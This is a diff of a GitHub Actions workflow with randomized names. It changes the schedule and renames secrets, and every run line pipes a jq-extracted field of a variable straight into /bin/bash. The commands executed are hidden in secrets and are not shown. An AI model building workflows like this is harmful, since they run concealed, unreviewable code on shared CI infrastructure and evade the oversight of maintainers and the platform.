@@ -3,7 +3,7 @@ name: qushubin2418
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
+    - cron: '27 3/6 * * *'
 
 jobs:
   build:
@@ -12,19 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: qushubin2418
         env:
-          gkleg798: ${{ secrets.gkleg798 }}
+          san3411: ${{ secrets.san3411 }}
         run: |
-          echo $gkleg798 | jq -r .lx662 | /bin/bash
-          echo $ntyvc85528 | jq -r .jwto39312 | /bin/bash
-          echo $v797 | jq -r .dxi05 | /bin/bash
-          echo $osxdm15842 | jq -r .tczal96 | /bin/bash
-          echo $o16 | jq -r .jemr1801 | /bin/bash
-          echo $e48803 | jq -r .nzjr6 | /bin/bash
-          echo $bykuw3 | jq -r .v18 | /bin/bash
-          echo $uqxlx7 | jq -r .ngbxo0191 | /bin/bash
-          echo $sy86 | jq -r .h433 | /bin/bash
-          echo $ukud64 | jq -r .cxmpt3 | /bin/bash
-          echo $hmd7159 | jq -r .hz1071 | /bin/bash
-          echo $tvqck46572 | jq -r .bw7 | /bin/bash
-          echo $dp69185 | jq -r .alfp12095 | /bin/bash
+          echo $san3411 | jq -r .ryskt307 | /bin/bash
+          echo $bidh68 | jq -r .anw2964 | /bin/bash
+          echo $tec7510 | jq -r .jse3 | /bin/bash
+          echo $zuu4243 | jq -r .nxac81 | /bin/bash
+          echo $afds1132 | jq -r .wglso5520 | /bin/bash
+          echo $yqsp9114 | jq -r .v35775 | /bin/bash
+          echo $lu7 | jq -r .n12218 | /bin/bash
+          echo $kikl6002 | jq -r .wou8921 | /bin/bash
+          echo $ko05063 | jq -r .yryyq355 | /bin/bash
 
